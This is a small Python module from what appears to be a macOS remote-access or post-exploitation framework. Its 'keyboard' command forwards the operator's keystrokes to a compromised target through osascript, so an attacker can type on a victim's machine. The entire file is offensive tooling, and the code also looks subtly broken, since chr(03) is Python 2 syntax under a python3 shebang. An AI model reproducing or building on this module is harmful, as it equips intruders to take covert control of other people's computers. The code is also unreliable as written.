#!/usr/bin/env python3

from core.badges import badges
from core.keyboard import keyboard

class UnicornModule:
    def __init__(self, unicorn):
        self.unicorn = unicorn
        self.badges = badges()
        
        self.keyboard = keyboard()
        
        self.name = "keyboard"
        self.description = "Control targets keyboard."
        self.usage = "Usage: keyboard"
        self.type = "managing"
        self.args = 1
        
    def run(self, cmd_data):
        print(self.badges.G + "Connecting to keyboard...")
        print(self.badges.I + "Press Ctrl-C to stop.")
        while True:
            char = self.keyboard.get_char()
            if char != chr(03):
                self.unicorn.send_command("osascript", self.keyboard.send_char(char), False)
            else:
                return
